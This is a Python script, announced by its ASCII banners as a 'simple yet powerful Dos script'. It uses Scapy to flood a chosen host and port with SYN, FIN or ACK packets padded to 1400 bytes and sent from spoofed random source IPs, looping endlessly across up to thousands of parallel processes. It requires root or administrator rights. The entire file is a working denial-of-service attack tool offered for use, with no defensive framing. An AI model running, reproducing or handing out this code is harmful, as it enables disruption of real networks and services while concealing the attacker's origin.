from scapy.all import *
import socket
import sys
from multiprocessing import Process
import random
import os

class colors:
    red = '\033[91m'
    green = '\033[92m'
    yellow = '\033[93m'
    purple = '\033[94m' 
    cyan = '\033[96m'
    color_end = '\033[00m'

VER = '0.1.0'

banner =[
    f"""{colors.cyan}
██████╗░░█████╗░░██████╗░░░██████╗░██╗░░░██╗
██╔══██╗██╔══██╗██╔════╝░░░██╔══██╗╚██╗░██╔╝
██║░░██║██║░░██║╚█████╗░░░░██████╔╝░╚████╔╝░
██║░░██║██║░░██║░╚═══██╗░░░██╔═══╝░░░╚██╔╝░░
██████╔╝╚█████╔╝██████╔╝██╗██║░░░░░░░░██║░░░
╚═════╝░░╚════╝░╚═════╝░╚═╝╚═╝░░░░░░░░╚═╝░░░
     A simple yet powerful Dos script     VERSION:{VER} {colors.color_end}
    """,
    f"""
    {colors.green}
███████████████████████████████████████████████████████████████████████████████████████
█░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░░░░░░░░░████████░░░░░░░░░░░░░░█░░░░░░░░██░░░░░░░░█
█░░▄▀▄▀▄▀▄▀░░░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░████████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀░░██░░▄▀▄▀░░█
█░░▄▀░░░░▄▀▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░████████░░▄▀░░░░░░▄▀░░█░░░░▄▀░░██░░▄▀░░░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░████████████████░░▄▀░░██░░▄▀░░███░░▄▀▄▀░░▄▀▄▀░░███
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░████████░░▄▀░░░░░░▄▀░░███░░░░▄▀▄▀▄▀░░░░███
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░████████░░▄▀▄▀▄▀▄▀▄▀░░█████░░░░▄▀░░░░█████
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░░░░░░░░░▄▀░░████████░░▄▀░░░░░░░░░░███████░░▄▀░░███████
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████████░░▄▀░░████████░░▄▀░░███████████████░░▄▀░░███████
█░░▄▀░░░░▄▀▄▀░░█░░▄▀░░░░░░▄▀░░█░░░░░░░░░░▄▀░░█░░░░░░█░░▄▀░░███████████████░░▄▀░░███████
█░░▄▀▄▀▄▀▄▀░░░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█░░▄▀░░███████████████░░▄▀░░███████
█░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░█░░░░░░███████████████░░░░░░███████
███████████████████████████████████████████████████████████████████████████████████████    
              A simple yet powerful Dos script   VERSION:{VER} {colors.color_end}
    """,
    f"""
    {colors.yellow}
───────────────────────────────────────────────────────────────────────────────────────
─████████████───██████████████─██████████████────────██████████████─████████──████████─
─██░░░░░░░░████─██░░░░░░░░░░██─██░░░░░░░░░░██────────██░░░░░░░░░░██─██░░░░██──██░░░░██─
─██░░████░░░░██─██░░██████░░██─██░░██████████────────██░░██████░░██─████░░██──██░░████─
─██░░██──██░░██─██░░██──██░░██─██░░██────────────────██░░██──██░░██───██░░░░██░░░░██───
─██░░██──██░░██─██░░██──██░░██─██░░██████████────────██░░██████░░██───████░░░░░░████───
─██░░██──██░░██─██░░██──██░░██─██░░░░░░░░░░██────────██░░░░░░░░░░██─────████░░████─────
─██░░██──██░░██─██░░██──██░░██─██████████░░██────────██░░██████████───────██░░██───────
─██░░██──██░░██─██░░██──██░░██─────────██░░██────────██░░██───────────────██░░██───────
─██░░████░░░░██─██░░██████░░██─██████████░░██─██████─██░░██───────────────██░░██───────
─██░░░░░░░░████─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██─██░░██───────────────██░░██───────
─████████████───██████████████─██████████████─██████─██████───────────────██████───────
───────────────────────────────────────────────────────────────────────────────────────    
              A simple yet powerful Dos script   VERSION:{VER} {colors.color_end}
    """
]

__banner__ = random.choice(banner)


if os.name == 'nt':
    try:
        with open(r'C:\Windows\System32\Tempo.txt','w') as writetempfile:
            writetempfile.write("0")
        os.remove(r'C:\Windows\System32\Tempo.txt')
    except PermissionError:
        print(f"{colors.red}Please run the script as prviliged user{colors.color_end}")
else:
    if not 'SUDO_UID' in os.environ.keys():
        print(f"{colors.red}Please run the script as prviliged user{colors.color_end}")
        sys.exit(1)

def get_ip(hostname):
    try:
        ip = socket.gethostbyname(hostname)
    except socket.gaierror:
        ip = '0'
    return ip
try:
    try:
        DEST_IP = sys.argv[1]
        socket.inet_aton(DEST_IP)
    except socket.error:
        DEST_IP = get_ip(DEST_IP)
        if DEST_IP == '0':
            print(f'{colors.red}Error:Not a valid host or ip address.{colors.color_end}')
            sys.exit()

    DEST_PORT = int(sys.argv[2])
    proces = int(sys.argv[3])
    type = sys.argv[4]
    if not type in ['F','S','A',]:
        print(__banner__)
        print(f'{colors.red}TypeError: Only use FIN=F SYN=S or ACK=A{colors.color_end}')
        quit()
except IndexError:
    print(__banner__)
    print(f"Usage: {sys.argv[0]} <IP> <Port> <no of processes> <type>")
    print(f"Example: {sys.argv[0]} 180.50.44.96 80 5000 S")
    quit()





def random_ip():
    return str(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")


def craftpkt(DEST_IP, DEST_PORT,type):
    ip=IP(dst=DEST_IP,src=random_ip())
    raw = Raw(b"X"*1400)
    tcp = TCP(sport=random.randint(1000,60000), dport=DEST_PORT, flags=type, seq=12345)
    p = ip / tcp / raw
    send(p, loop=1, verbose=0)




print(__banner__)
print(f"{colors.cyan}Attacking {DEST_IP} on port {DEST_PORT} with {proces} processes{colors.color_end}")
try:
    process_list = []
    for _ in range(proces):
        _process = Process(target=craftpkt, args=(DEST_IP,DEST_PORT,type))
        process_list.append(_process)
        _process.start()
except KeyboardInterrupt:
    print(f"{colors.green}Cleaning up!..{colors.color_end}")
    for _process in process_list:
        try:
            _process.terminate()
        except Exception:
            continue    
    sys.exit()
